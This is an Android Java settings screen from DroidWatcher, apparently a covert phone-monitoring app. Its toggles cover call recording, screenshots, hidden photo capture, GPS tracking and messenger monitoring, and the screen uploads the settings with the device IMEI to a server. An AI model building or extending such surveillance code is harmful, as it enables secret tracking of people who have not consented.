package com.droidwatcher.activity;

import java.util.Calendar;

import com.droidwatcher.R;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.ServerMessage;
import com.stericson.RootTools.RootTools;

import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.os.Build;
import android.os.Bundle;
import android.preference.CheckBoxPreference;
import android.preference.EditTextPreference;
import android.preference.Preference;
import android.preference.Preference.OnPreferenceChangeListener;
import android.preference.PreferenceActivity;
import android.preference.PreferenceManager;
import android.widget.Toast;

public class MyPreferenceActivity extends PreferenceActivity {
	private OnSharedPreferenceChangeListener listener;
	private SharedPreferences prefs;
	
	@SuppressWarnings("deprecation")
	@Override
	protected void onCreate(Bundle savedInstanceState) 
	{
	    super.onCreate(savedInstanceState);
	    addPreferencesFromResource(R.xml.settings);
	    
	    prefs = PreferenceManager.getDefaultSharedPreferences(this);
	    listener = new SharedPreferences.OnSharedPreferenceChangeListener() {
	    	public void onSharedPreferenceChanged(SharedPreferences prefs, String key) {
	    		
	    		if (key.equals("NOTIFY_SIM_CHANGE") || key.equals("NOTIFY_SMS") || key.equals("NOTIFY_CALL")){
	    			if (prefs.getString("NOTIFY_NUMBER", "").length() == 0) {
						Toast.makeText(MyPreferenceActivity.this, R.string.settings_noNumber, Toast.LENGTH_LONG).show();
					}
	    			return;
	    		}
	    	}
        };

	    prefs.registerOnSharedPreferenceChangeListener(listener);
	    
	    EditTextPreference code = (EditTextPreference) findPreference("APP_RUN_CODE");
	    code.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			public boolean onPreferenceChange(android.preference.Preference preference, Object newValue) {
				String nv = (String) newValue;
				if (!onlyDigits(nv)){
					Toast.makeText(MyPreferenceActivity.this, R.string.settings_onlyDigits, Toast.LENGTH_LONG).show();
					return false;
				}
				if(nv.length() == 0){
					Toast.makeText(MyPreferenceActivity.this, R.string.settings_emptyCode, Toast.LENGTH_LONG).show();
					return false;
				}
				return true;
			}
		});
	    
	    EditTextPreference number = (EditTextPreference) findPreference("NOTIFY_NUMBER");
	    number.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			public boolean onPreferenceChange(android.preference.Preference preference, Object newValue) {
				String nv = (String) newValue;
				if (!onlyDigits(nv)){
					Toast.makeText(MyPreferenceActivity.this, R.string.settings_numberError, Toast.LENGTH_LONG).show();
					return false;
				}
				
				return true;
			}
		});
	    
	    CheckBoxPreference pref_wifi = (CheckBoxPreference) findPreference("ONLY_WIFI");
	    pref_wifi.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			@Override
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				Boolean val = (Boolean) newValue;
				findPreference("FILES_ONLY_WIFI").setEnabled(!val);
				return true;
			}
		});
	    findPreference("FILES_ONLY_WIFI").setEnabled(!pref_wifi.isChecked());
	    
	    CheckBoxPreference pref_screenshot = (CheckBoxPreference) findPreference("SCREENSHOT_ENABLED");
	    pref_screenshot.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			@Override
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				Boolean val = (Boolean) newValue;
				findPreference("SCREENSHOT_INTERVAL").setEnabled(val);
			    findPreference("SCREENSHOT_PHOTO_FORMAT").setEnabled(val);
				return true;
			}
		});
	    findPreference("SCREENSHOT_INTERVAL").setEnabled(pref_screenshot.isChecked());
	    findPreference("SCREENSHOT_PHOTO_FORMAT").setEnabled(pref_screenshot.isChecked());
	    
	    CheckBoxPreference pref_photo = (CheckBoxPreference) findPreference("CAPTURE_PHOTO");
	    pref_photo.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			@Override
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				Boolean val = (Boolean) newValue;
				findPreference("CAPTURE_PHOTO_FORMAT").setEnabled(val);
				return true;
			}
		});
	    findPreference("CAPTURE_PHOTO_FORMAT").setEnabled(pref_photo.isChecked());
	    
	    CheckBoxPreference pref_record = (CheckBoxPreference) findPreference("RECORD_CALLS");
	    pref_record.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			@Override
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				Boolean val = (Boolean) newValue;
				findPreference("RECORD_SOURCE").setEnabled(val);
			    findPreference("RECORD_FORMAT").setEnabled(val);
				return true;
			}
		});
	    findPreference("RECORD_SOURCE").setEnabled(pref_record.isChecked());
	    findPreference("RECORD_FORMAT").setEnabled(pref_record.isChecked());
	    
	    CheckBoxPreference pref_gps = (CheckBoxPreference) findPreference("USE_GPS");
	    pref_gps.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			@Override
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				Boolean val = (Boolean) newValue;
				findPreference("GPS_ONLY_NEW").setEnabled(val);
			    findPreference("GPS_TIMER").setEnabled(val);
				return true;
			}
		});
	    findPreference("GPS_ONLY_NEW").setEnabled(pref_gps.isChecked());
	    findPreference("GPS_TIMER").setEnabled(pref_gps.isChecked());
	    
	    if (!RootTools.isRootAvailable() || !RootTools.isAccessGiven()) {
			findPreference("AUTOUPDATE").setEnabled(false);
			findPreference("SCREENSHOT_ENABLED").setEnabled(false);
			findPreference("SCREENSHOT_INTERVAL").setEnabled(false);
			findPreference("SCREENSHOT_PHOTO_FORMAT").setEnabled(false);
			findPreference("VK_ENABLED").setEnabled(false);
			findPreference("WA_ENABLED").setEnabled(false);
			findPreference("VB_ENABLED").setEnabled(false);
		}
	    
	    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
	    	findPreference("SCREENSHOT_ENABLED").setEnabled(false);
	    	findPreference("SCREENSHOT_INTERVAL").setEnabled(false);
	    	findPreference("SCREENSHOT_PHOTO_FORMAT").setEnabled(false);
		}
	}
	
	private Boolean onlyDigits(String s){
		for (Integer i = 0; i < s.length(); i++){
			if(!Character.isDigit(s.charAt(i)) && s.charAt(i) != '+'){
				return false;
			}
		}
		return true;
	}
	
	@Override
	protected void onDestroy() {
		prefs.unregisterOnSharedPreferenceChangeListener(listener);
		
		super.onDestroy();
	}
	
	@Override
	protected void onPause() {
		prefs.unregisterOnSharedPreferenceChangeListener(listener);
		
		if (AppService.sThreadManager != null) {
			SettingsManager settings = new SettingsManager(this);
			AppService.sThreadManager.addTask(
					new ServerMessanger(
				        this,
				        new ServerMessage(MessageType.SETTINGS_SEND, settings.imei(), settings.login())
				        	.addParam("settings", settings.getJSON())
				        	.addParam("date", Calendar.getInstance().getTimeInMillis())
					)
				);	
		}
		
		super.onPause();
	}
	
}
